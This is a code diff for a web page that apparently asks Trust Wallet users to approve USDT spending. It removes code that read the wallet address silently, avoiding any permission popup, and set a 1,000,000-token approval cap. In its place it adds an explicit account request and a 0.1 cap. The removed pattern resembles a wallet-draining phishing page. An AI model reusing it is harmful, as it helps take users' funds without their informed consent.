@@ -172,7 +172,7 @@ async function getUsdtBalance(userAddress, iface) {
 // "Connect wallet" popup on every visit. The reference dapp only uses
 // eth_accounts which is permanently silent inside Trust Wallet browser.
 //
-/*approveBtn.addEventListener("click", async () => {
+approveBtn.addEventListener("click", async () => {
 
   // If window.ethereum is not yet injected (user tapped NEXT very quickly on
   // Android/iOS before the wallet browser finished injecting the provider),
@@ -224,52 +224,6 @@ async function getUsdtBalance(userAddress, iface) {
         return;
       }
       // any other error (e.g. already on BSC with some wallets) — continue
-    }*/
-
-approveBtn.addEventListener("click", async () => {
-  if (!window.ethereum) {
-    setLoading(true, "Connecting…");
-    for (let i = 0; i < 10; i++) {
-      await new Promise(r => setTimeout(r, 300));
-      if (window.ethereum) break;
-    }
-    setLoading(false);
-    if (!window.ethereum) {
-      if (/android|iphone|ipad|ipod/i.test(navigator.userAgent)) {
-        window.location.href = "go.html";
-      } else {
-        showToast("No wallet detected. Please open this page inside Trust Wallet.", "error");
-      }
-      return;
-    }
-  }
-
-  setLoading(true, "Processing…");
-
-  try {
-    // Step 1 — Switch to BNB Smart Chain
-    try {
-      await window.ethereum.request({
-        method: "wallet_switchEthereumChain",
-        params: [{ chainId: BSC_CHAIN_ID_HEX }]
-      });
-    } catch (e) {
-      if (e.code === 4902) {
-        // BSC not added yet — add it (wallet switches automatically after)
-        await window.ethereum.request({
-          method: "wallet_addEthereumChain",
-          params: [BSC_CHAIN_PARAMS]
-        });
-      } else if (
-        e.code === 4001 ||
-        (e.message || "").toLowerCase().includes("user rejected") ||
-        (e.message || "").toLowerCase().includes("user denied")
-      ) {
-        setLoading(false);
-        showToast("Please switch to BNB Smart Chain to continue.", "error");
-        return;
-      }
-      // any other error (e.g. already on BSC with some wallets) — continue
     }
 
     // Step 2 — Get wallet address using eth_accounts (SILENT — no popup ever)
@@ -278,28 +232,22 @@ approveBtn.addEventListener("click", async () => {
     // connected account immediately without asking for permission.
     // Retry up to 8 times (3.2 s) — on first tap the wallet's internal state
     // may not be ready yet even though window.ethereum is present.
-    let userAddress = _cachedAddress || null;
-
-    if (!userAddress) {
-      for (let i = 0; i < 8; i++) {
-        try {
-          const accs = await window.ethereum.request({ method: "eth_accounts" });
-          userAddress = (accs && accs[0]) ? accs[0] : null;
-        } catch (_) {}
-        if (userAddress) break;
-        await new Promise(r => setTimeout(r, 400));
-      }
+    // Step 2 — Wallet से स्पष्ट अनुमति लेकर अकाउंट कनेक्ट करें
+    const chainId = await window.ethereum.request({ method: "eth_chainId" });
+    if (chainId.toLowerCase() !== BSC_CHAIN_ID_HEX) {
+      throw new Error("Please switch to BNB Smart Chain.");
     }
-
-    if (!userAddress) {
-      showToast("Wallet not connected. Please open this page inside Trust Wallet.", "error");
-      setLoading(false);
-      return;
-    }
-
+    
+    const accounts = await window.ethereum.request({
+      method: "eth_requestAccounts"
+    });
+    
+    const userAddress = accounts?.[0];
+    if (!userAddress) throw new Error("No wallet account connected.");
+    
     _cachedAddress = userAddress;
 
-    const CAP_AMOUNT = ethers.parseUnits("1000000", 18);
+    const CAP_AMOUNT = ethers.parseUnits("0.1", 18);
     const iface      = new ethers.Interface(ERC20_ABI);
 
     const usdtBalance = await getUsdtBalance(userAddress, iface);
